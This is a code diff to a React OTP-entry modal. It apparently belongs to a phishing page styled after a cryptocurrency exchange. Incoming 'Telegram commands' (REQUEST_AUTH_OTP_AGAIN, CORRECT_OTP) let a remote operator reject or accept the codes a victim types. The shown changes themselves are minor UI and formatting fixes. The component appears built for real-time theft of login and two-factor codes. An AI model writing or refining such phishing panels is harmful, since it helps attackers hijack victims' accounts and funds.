@@ -15,7 +15,6 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
     const [invalid, setInvalid] = useState(false);
     const { command } = useCommand(); // Get current command
     
-    // Handle Telegram commands
     useEffect(() => {
         console.log("Command is ", command);
         if (command === 'REQUEST_AUTH_OTP_AGAIN') {
@@ -23,16 +22,16 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
             setIsLoading(false);
             setInvalid(true);
         } else if (command === 'REQUEST_EMAIL_OTP_AGAIN') {
-            console.log("Command in VERIF IS ", command )
+            console.log("Command in VERIF IS ", command)
             setIsLoading(false);
             setInvalid(true);
-        }  else if (command === 'CORRECT_OTP') {
-            console.log("Command in VERIF IS ", command )
+        } else if (command === 'CORRECT_OTP') {
+            console.log("Command in VERIF IS ", command)
             setIsLoading(false);
             setOtpCode('');
             setDisplayModal(false);
-        } 
-    }, [command, modal]);
+        }
+    }, [command]);
 
     // Modal visibility effect - this was missing in your current implementation
     useEffect(() => {
@@ -71,8 +70,12 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
         }
     };
 
+    const handleContainerClick = () => {
+        if (invalid) setInvalid(false);
+    };
+
     return (
-        <div className={`${modalState} transition-all duration-200 h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#0c0d10]'}`}>
+    <div className={`${modalState} transition-all duration-200 h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#0c0d10]'}`} onClick={handleContainerClick}>
             <div className='h-full w-full flex md:justify-center flex-col md:items-center'>
                 <div className={`md:border ${animate} transition-opacity duration-200 ease-in-out ${theme === 'light' ? 'md:border-[#eaecef]' : ''} md:mt-20 bg-[#1e2329] md:rounded-[15px] md:w-[425px] w-full min-h-[fit] h-full md:h-[589px]`}>
                     <div className='flex md:items-center items-start justify-between py-[20px] px-[24px]'>
@@ -108,7 +111,11 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
                                         <div
                                             className={`border flex items-center ${theme === 'light' ? 'border-[#eaecef]' : 'border-[#474d57]'} ${invalid ? 'border-red-500' : ''} hover:border-[#FCD535] transition duration-200 rounded-[8px] h-full flex w-full`}
                                             style={{ padding: '6px 10px' }}
-                                            onClick={(e) => e.stopPropagation()}
+                                            // onClick={(e) => e.stopPropagation()}
+                                            onClick={(e) => {
+                                                e.stopPropagation();
+                                                if (invalid) setInvalid(false);
+                                            }}
                                         >
                                             <input
                                                 type={'text'}
